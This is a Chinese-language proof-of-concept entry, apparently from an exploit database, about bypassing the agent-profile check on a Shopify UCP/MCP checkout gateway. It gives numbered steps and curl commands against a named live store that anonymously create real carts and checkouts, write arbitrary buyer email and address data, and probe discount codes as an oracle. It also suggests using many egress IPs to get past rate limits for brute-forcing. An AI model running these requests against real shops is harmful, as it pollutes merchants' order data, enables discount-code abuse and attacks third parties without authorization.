# Shopify UCP/MCP 网关 agent-profile 门禁自绕：匿名创建 Cart/Checkout（含限流与 JWT 边界）

- **code**: shopify-ucp-mcp-profile-bypass
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify UCP/MCP
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: retro32.com 实测 2026-11-11：GET /.well-known/ucp 200（transport=mcp）；tools/list 匿名 200 共 14 工具；create_checkout 带 profile 匿名 200 回显真实 gid://shopify/Checkout/...?key=...，totals subtotal 2500 + fulfillment 400 = 2900，buyer.email/收货地址原样落对象；discounts.codes 无效码返回 discount_code_invalid；get_checkout 去 key => invalid_checkout_id；连续调用 429 retry_after ~2402s；batch 数组 400 code -32600；get_order/complete_checkout 无 JWT => 403 -32000。
- **path**: pocs/shopify-ucp-mcp-profile-bypass/poc.http
- **tags**: shopify,ucp,mcp,json-rpc,unauthorized,rate-limit,checkout,cart
- **created_at**: 2026-11-11T21:24:36.231Z
- **engine**: https://www.retro32.com/api/ucp/mcp

## 用法

```
1) 探测：GET https://<shop>/.well-known/ucp，200 且含 "transport":"mcp"、"endpoint":"https://<shop>.myshopify.com/api/ucp/mcp" 即候选；2) POST <endpoint> tools/list（头 Content-Type: application/json + Accept: application/json, text/event-stream）确认 14 工具；3) 关键：所有 tools/call 的 arguments.meta.ucp-agent.profile 填该店铺自己的 https://<shop>/.well-known/ucp 即可过门禁；4) search_catalog 取真实 ProductVariant gid；5) create_cart/create_checkout 需 context.address_country（如 GB），否则 out_of_stock；checkout 可带 buyer.email + fulfillment destinations 写入任意 PII；6) 金额随 quantity 精确变化可证对象真实；cancel_* 后 get_* 报 not_found 可证状态变更落库；7) discounts.codes 可做折扣码有效性 oracle（无效码 => discount_code_invalid）。
```

## 正文

```
# Shopify UCP/MCP 网关 agent-profile 门禁自绕

## 适用条件
- Shopify 托管店，`/.well-known/ucp` 返回 200 JSON，含 `"transport":"mcp"` 与 `"endpoint":"https://<store>.myshopify.com/api/ucp/mcp"`。
- 无需任何 Cookie / JWT / 账号。

## 核心缺陷
`tools/call` 要求 `arguments.meta.ucp-agent.profile`，服务端只校验「该 URI 可被抓取」，不校验归属/签名。填店铺自身公开文档即通过；去掉 profile 立即 `422 invalid_profile_url`，证明是门禁自绕。

## 最小验证（curl）
```bash
EP=https://www.retro32.com/api/ucp/mcp
PROFILE=https://www.retro32.com/.well-known/ucp
H=(-H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream')

# 工具清单
curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'

# 匿名创建 checkout（GB 上下文必须，否则 out_of_stock；金额 2500）
curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_checkout","arguments":{"meta":{"ucp-agent":{"profile":"'"$PROFILE"'"}},"checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VID>"},"quantity":1}],"buyer":{"email":"probe@example.com"},"context":{"address_country":"GB"}}}}}'
# => 200 {"ucp":{...},"id":"gid://shopify/Checkout/<X>?key=<Y>","totals":[...],"expires_at":...}

# 折扣码 oracle：无效码 => messages[].code=discount_code_invalid
curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"update_checkout","arguments":{"meta":{"ucp-agent":{"profile":"'"$PROFILE"'"}},"id":"gid://shopify/Checkout/<X>?key=<Y>","checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VID>"},"quantity":1}],"discounts":{"codes":["WELCOME10"]}}}}}'
```

## 坑与边界（实测）
- **强限流**：约 2400s 固定窗口 + 少量请求配额，超出返回 `429 code -32000 Rate limit exceeded` + `retry after ~2400 seconds`。批量刷对象、折扣码爆破在单出口不可行；需要多出口/长周期慢速。
- **JSON-RPC batch 不支持**：数组体 => `400 code -32600 Invalid Request`，不能批量绕限流。
- **key 强制**：`get_checkout` 去掉 `?key=` => `invalid_checkout_id`；换对象 GID + 本把 key => `cart_not_found`，非 IDOR。
- **complete_checkout / get_order 需 JWT**：无 JWT => `403 -32000 AuthenticationRequired`；`alg=none` => `401 Invalid global access token`。
- **目录面公开**：search_catalog/get_product 仅公开 storefront 字段（description/price/variants/collections），无库存/成本。
- **continue_url** 在 Web 侧 301 回落 `/cart`，不直接呈现对象内容。
- 目标为 Shopify SaaS，无服务器权限与 webshell 面：本链只能做到「未认证交易对象创建 + 任意 PII 写入 + 折扣码 oracle」，不构成持久化立足点。

## 影响
未认证创建真实 Cart/Checkout（金额随 quantity 精确变化），写入任意 buyer.email/收货地址/电话 → 商家后台数据污染与社工面；折扣码存在性 oracle；profile 参数同时构成盲 SSRF。
```
